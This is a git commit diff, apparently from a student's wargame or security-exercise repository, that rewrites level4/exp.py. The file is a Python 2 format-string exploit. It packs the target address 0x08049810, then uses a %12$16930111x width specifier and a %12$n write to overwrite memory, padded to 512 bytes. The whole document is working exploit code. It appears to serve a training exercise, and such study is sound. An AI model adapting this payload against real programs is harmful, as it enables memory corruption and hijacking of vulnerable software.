412c66409211337f06f03db74f6789a1092770f0
AbdouBouallaga <babdelka@student.1337.ma>
2022-06-10 18:27:00 +0100

    update

--- level4/exp.py
+++ level4/exp.py
@@ -2,4 +2,11 @@ import struct
 
 addr = struct.pack("I", 0x08049810)
 
-print addr+("A" * 16930112)+"%12$16930112n"
+def pad(s):
+    return s+"A"*(512-len(s))
+
+pl = ""
+pl += addr
+pl += "%12$16930111x "
+pl += "%12$n"
+print pad(pl)
